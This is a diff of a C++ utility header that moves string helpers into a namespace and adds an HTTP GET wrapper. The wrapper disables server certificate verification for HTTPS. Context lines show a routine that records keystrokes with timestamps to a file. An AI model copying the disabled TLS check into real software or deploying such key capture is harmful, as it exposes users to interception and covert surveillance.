@@ -15,7 +15,14 @@
 #endif
 
 #ifdef CPPHTTPLIB_HTTPLIB_SUPPORT
+/* macOS CMakeLists.txt
+ * include_directories(${CMAKE_CURRENT_SOURCE_DIR}/../common/github.com/unwitting.life/cpp-utils/OpenSSL/3.0.6+/darwin64-x86_64-cc/include)
+ * link_directories(${CMAKE_CURRENT_SOURCE_DIR}/../common/github.com/unwitting.life/cpp-utils/OpenSSL/3.0.6+/darwin64-x86_64-cc/lib)
+ * add_executable(${PROJECT_NAME} main.cpp)
+ * target_link_libraries(${PROJECT_NAME} crypto ssl)
+ */
 #define CPPHTTPLIB_OPENSSL_SUPPORT
+
 #include "cpp-httplib/v0.11.2+/httplib.h"
 
 #ifdef _MSC_VER
@@ -49,9 +56,13 @@
 #else
 #define UNC R"(\\)"
 #define string_t std::string
+#define TCHAR char
+#define _T(x) x
+#define _countof(x) sizeof(x) / sizeof(x[0])
+#define __countof(x) _countof(x)
 #endif
 
-#ifdef WIN32
+#ifdef _MSC_VER
 #define PATH_SEPARATOR '\\'
 #else
 #define PATH_SEPARATOR '/'
@@ -60,77 +71,158 @@
 #define LF _T("\n")
 
 namespace utils {
-    template<class T, class U> inline string_t replace(
-        string_t s, const T& target, const U& replacement, bool replace_first = 0, bool replace_empty = 0) {
-        using S = string_t;
-        using C = string_t::value_type;
-        using N = string_t::size_type;
-        struct {
-            auto len(const S& s) { return s.size(); }
-            auto len(const C* p) { return std::char_traits<C>::length(p); }
-            auto len(const C  c) { return 1; }
-            auto sub(S* s, const S& t, N pos, N len) { s->replace(pos, len, t); }
-            auto sub(S* s, const C* t, N pos, N len) { s->replace(pos, len, t); }
-            auto sub(S* s, const C  t, N pos, N len) { s->replace(pos, len, 1, t); }
-            auto ins(S* s, const S& t, N pos) { s->insert(pos, t); }
-            auto ins(S* s, const C* t, N pos) { s->insert(pos, t); }
-            auto ins(S* s, const C  t, N pos) { s->insert(pos, 1, t); }
-        } util;
-
-        N target_length = util.len(target);
-        N replacement_length = util.len(replacement);
-        if (target_length == 0) {
-            if (!replace_empty || replacement_length == 0) return s;
-            N n = s.size() + replacement_length * (1 + s.size());
-            s.reserve(!replace_first ? n : s.size() + replacement_length);
-            for (N i = 0; i < n; i += 1 + replacement_length) {
-                util.ins(&s, replacement, i);
-                if (replace_first) break;
-            }
-            return s;
-        }
-
-        N pos = 0;
-        while ((pos = s.find(target, pos)) != string_t::npos) {
-            util.sub(&s, replacement, pos, target_length);
-            if (replace_first) return s;
-            pos += replacement_length;
-        }
-        return s;
-    }
-
+    namespace strings {
 #ifndef SPRINTF_BUFFER_SIZE
 #define SPRINTF_BUFFER_SIZE 8192
 #endif
 
-    string_t sprintf(string_t format, ...) {
-        string_t s;
-        auto p = new TCHAR[SPRINTF_BUFFER_SIZE];
-        if (p) {
-            va_list args;
-            va_start(args, format);
-            _vsntprintf_s(p, SPRINTF_BUFFER_SIZE - 1, SPRINTF_BUFFER_SIZE - 1, format.c_str(), args);
-            va_end(args);
-            s = p;
-            delete[] p;
-            p = nullptr;
+        template<class T, class U>
+        inline string_t replace(
+                string_t s, const T &target, const U &replacement, bool replace_first = 0, bool replace_empty = 0) {
+            using S = string_t;
+            using C = string_t::value_type;
+            using N = string_t::size_type;
+            struct {
+                auto len(const S &s) { return s.size(); }
+
+                auto len(const C *p) { return std::char_traits<C>::length(p); }
+
+                auto len(const C c) { return sizeof(c); }
+
+                auto sub(S *s, const S &t, N pos, N len) { s->replace(pos, len, t); }
+
+                auto sub(S *s, const C *t, N pos, N len) { s->replace(pos, len, t); }
+
+                auto sub(S *s, const C t, N pos, N len) { s->replace(pos, len, 1, t); }
+
+                auto ins(S *s, const S &t, N pos) { s->insert(pos, t); }
+
+                auto ins(S *s, const C *t, N pos) { s->insert(pos, t); }
+
+                auto ins(S *s, const C t, N pos) { s->insert(pos, 1, t); }
+            } util;
+
+            N target_length = util.len(target);
+            N replacement_length = util.len(replacement);
+            if (target_length == 0) {
+                if (!replace_empty || replacement_length == 0) return s;
+                N n = s.size() + replacement_length * (1 + s.size());
+                s.reserve(!replace_first ? n : s.size() + replacement_length);
+                for (N i = 0; i < n; i += 1 + replacement_length) {
+                    util.ins(&s, replacement, i);
+                    if (replace_first) break;
+                }
+                return s;
+            }
+
+            N pos = 0;
+            while ((pos = s.find(target, pos)) != string_t::npos) {
+                util.sub(&s, replacement, pos, target_length);
+                if (replace_first) return s;
+                pos += replacement_length;
+            }
+            return s;
         }
-        return s;
-    }
 
-    std::string itoa16(int i) {
-        std::string s;
-        char hex[100] = { 0 };
-        _itoa_s(i, hex, 16);
-        return hex;
-    }
+        string_t sprintf(string_t format, ...) {
+            string_t s;
+            auto p = new TCHAR[SPRINTF_BUFFER_SIZE];
+#ifdef _MSC_VER
+            if (p) {
+#endif
+                va_list args;
+                va_start(args, format);
+#ifdef _MSC_VER
+                _vsntprintf_s(p, SPRINTF_BUFFER_SIZE - 1, SPRINTF_BUFFER_SIZE - 1, format.c_str(), args);
+#else
+                vsnprintf(p, SPRINTF_BUFFER_SIZE - 1, format.c_str(), args);
+#endif
+                va_end(args);
+                s = p;
+                delete[] p;
+#ifdef _MSC_VER
+                p = nullptr;
+            }
+#endif
+            return s;
+        }
 
-    string_t upper(string_t s) {
-        string_t copy = s;
-        std::transform(copy.begin(), copy.end(), copy.begin(), ::toupper);
-        return copy;
-    }
+        std::string itoa16(int i) {
+            std::string s;
+            char hex[100] = {0};
+            snprintf(hex, _countof(hex) - 1, _T("%x"), i);
+            return hex;
+        }
 
+        std::string hex(int i) {
+            return itoa16(i);
+        }
+
+        string_t lower(string_t s) {
+            string_t copy = s;
+            std::transform(copy.begin(), copy.end(), copy.begin(), ::tolower);
+            return copy;
+        }
+
+        string_t upper(string_t s) {
+            string_t copy = s;
+            std::transform(copy.begin(), copy.end(), copy.begin(), ::toupper);
+            return copy;
+        }
+
+        bool startsWith(string_t s, string_t find) {
+            return s.find(find) == 0;
+        }
+
+        string_t find(string_t s, string_t prefix, string_t suffix) {
+            string_t find_;
+            auto prefix_ = s.find(prefix);
+            if (prefix_ != std::string::npos) {
+                auto suffix_ = suffix.empty() ? std::string::npos : s.find(suffix, prefix_ + prefix.size());
+                if (suffix_ == std::string::npos) {
+                    find_ = s.substr(prefix_);
+                } else {
+                    find_ = s.substr(prefix_, suffix_ - prefix_ - suffix.size() + 1);
+                }
+            }
+            return find_;
+        }
+
+        string_t find(string_t s, string_t prefix) {
+            return find(s, prefix, string_t());
+        }
+    }
+    namespace httplib {
+#define HTTP_OK 200
+#define HTTP_SCHEMA "http://"
+#define HTTPS_SCHEMA "https://"
+        std::string Get(std::string uri) {
+            std::string body;
+            auto host = strings::lower(uri);
+            if (!host.empty()) {
+                if (host.at(host.size() - 1) != '/') {
+                    host += "/";
+                }
+                auto http = strings::find(host, HTTP_SCHEMA, "/");
+                auto https = strings::find(host, HTTPS_SCHEMA, "/");
+                if (!http.empty()) {
+                    ::httplib::Client client(http);
+                    auto result = client.Get(host.substr(http.size()));
+                    if (result && result->status == HTTP_OK) {
+                        body = result->body;
+                    }
+                } else if (!https.empty()) {
+                    ::httplib::SSLClient sslClient(strings::replace(https, HTTPS_SCHEMA, ""));
+                    sslClient.enable_server_certificate_verification(false);
+                    auto result = sslClient.Get(host.substr(https.size()));
+                    if (result) {
+                        body = result->body;
+                    }
+                }
+            }
+            return body;
+        }
+    }
 #ifdef _MSC_VER
     void writeLog(string_t);
 
@@ -148,6 +240,11 @@ namespace utils {
         return result;
     }
 
+    namespace httplib {
+        std::string Get(std::wstring uri) {
+            return httplib::Get(w2s(uri));
+        }
+    }
 #ifdef UNICODE
 #define _s2w s2w
 #else
@@ -169,7 +266,7 @@ namespace utils {
                 RtlZeroMemory(p, dwHashDataLength + 1);
                 if (CryptGetHashParam(hCryptHash, HP_HASHVAL, p, &dwHashDataLength, 0)) {
                     for (DWORD i = 0; i < dwHashDataLength; i++) {
-                        hash_ += utils::upper(_s2w(utils::itoa16(p[i])));
+                        hash_ += upper(_s2w(itoa16(p[i])));
                     }
                 }
                 delete[] p;
@@ -301,7 +398,7 @@ namespace utils {
             SetConsoleTextAttribute(hConsole, FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_RED);
 
             string_t line;
-            auto datetime = utils::sprintf(_T("[%s] "), Now().c_str());
+            auto datetime = sprintf(_T("[%s] "), Now().c_str());
             _tprintf(_T("%s"), datetime.c_str());
             line += datetime;
 
@@ -402,9 +499,9 @@ namespace utils {
                             if (!keyboard[i]) {
                                 keyboard[i] = true;
                                 if (i >= '0' && i <= '9') {
-                                    line = utils::sprintf(_T("%c"), (TCHAR)i);
+                                    line = sprintf(_T("%c"), (TCHAR)i);
                                 } else if (i >= 'A' && i <= 'Z') {
-                                    line = utils::sprintf(_T("%c"), (TCHAR)(i - 'A' + 'a'));
+                                    line = sprintf(_T("%c"), (TCHAR)(i - 'A' + 'a'));
                                 } else if (i == VK_SPACE) {
                                     line = _T(" ");
                                 } else if (i == VK_OEM_PERIOD) {
@@ -609,7 +706,7 @@ namespace utils {
                                     PRINT_VK(VK_LCONTROL);
 #undef PRINT_VK
                                     if (!printed) {
-                                        line = utils::sprintf(_T("0x%02x"), i);
+                                        line = sprintf(_T("0x%02x"), i);
                                     }
                                 }
                             }
@@ -624,7 +721,7 @@ namespace utils {
                             if (ftell(file) > 0) {
                                 out = LF;
                             }
-                            out += utils::sprintf(_T("[%s] %s"), Now().c_str(), line.c_str());
+                            out += sprintf(_T("[%s] %s"), Now().c_str(), line.c_str());
                         }
 #ifdef UNICODE
                         std::string ansi = w2s(out);
